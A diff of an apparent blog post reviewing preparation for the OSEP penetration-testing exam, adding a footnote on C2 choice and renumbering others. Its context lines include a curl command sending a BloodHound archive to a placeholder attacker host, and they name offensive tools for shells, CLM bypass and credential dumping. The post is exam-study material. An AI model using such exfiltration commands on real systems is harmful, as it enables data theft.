@@ -67,7 +67,7 @@ I prepped for 1.5 months, and this was my strategy:
 - [updog](https://github.com/sc0tfree/updog) is god. You can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
 - migrate your revshell processes for stability.
 - get comfortable with network pivoting.
-- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide.
+- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide. [^4]
 - read the exam guide and the exam objectives. For instance, ai chatbots, paid tools and automated exploitation are not allowed.
 - IMHO, the challenges prepare you _enough_ to face the exam. Although I've heard HTB RastaLabs and Offshore are good prep too.
 - have a plan z: there are too many variables involved, so if something fails, you need to know different alternatives.
@@ -88,14 +88,14 @@ OSEP-specific resources sorted by subjective usefulness:
 Related off-topic resources:
 - [ippsec writeups](https://ippsec.rocks)
 - [goad pwning series by mayfly277](https://mayfly277.github.io/posts/GOADv2/)
-- [tcm ad section of the PEH course](https://tcm-sec.com/academy/practical-ethical-hacking/)[^4].
+- [tcm ad section of the PEH course](https://tcm-sec.com/academy/practical-ethical-hacking/)[^5].
 - [orange cyberdefense ad cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 
 Not strictly required, but the book _"Evading EDR"_ from No Starch Press is 🔥:
 ![Evading EDR book](/assets/img/evading-edr.jpeg)
 
 ### my gig
-Here was my arsenal of tools[^5]:
+Here was my arsenal of tools[^6]:
 - external recon: [autorecon](https://github.com/AutoRecon/AutoRecon)
 - c2: keep calm and use [meterpreter](https://www.offsec.com/metasploit-unleashed/) (with custom c# loaders aligned with the book's content)
 - clm: [bypass-clm](https://github.com/calebstewart/bypass-clm)
@@ -120,7 +120,7 @@ And my kali setup:
 
 As you may already know, OffSec advanced exams give you 48h for the technical part and 24h to write the report. I knew it was going to be *intense*.
 
-I grabbed a monster[^6] and started it at 0100 AM. I promised myself I wouldn't go to sleep until I got comfortable with the progress.
+I grabbed a monster[^7] and started it at 0100 AM. I promised myself I wouldn't go to sleep until I got comfortable with the progress.
 
 After 5 hours I had 30 points. I was feeling confident about the next steps, so I took a nap.
 
@@ -386,6 +386,7 @@ Already deep into [OSED](https://www.offsec.com/courses/exp-301/) prep. Will sha
 [^1]: well, generalizing here: there are others like CRTO, CRTE, CRTL, etc. There's no 1-to-1 comparison since each one focuses on a different angle: evasion, c2, etc.
 [^2]: Wasted hours because of this, kek.
 [^3]: somehow slow AF.
-[^4]: I had already purchased it when doing the PNPT cert a while ago.
-[^5]: note that I've omitted the most obvious ones like `mimikatz` or `secretsdump`. Duh.
-[^6]: not sponsored.
+[^4]: I used msf because I was more familiar with it and it aligns with the course content. That said, other options like Sliver also have [success stories worth checking out](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver).
+[^5]: I had already purchased it when doing the PNPT cert a while ago.
+[^6]: note that I've omitted the most obvious ones like `mimikatz` or `secretsdump`. Duh.
+[^7]: not sponsored.
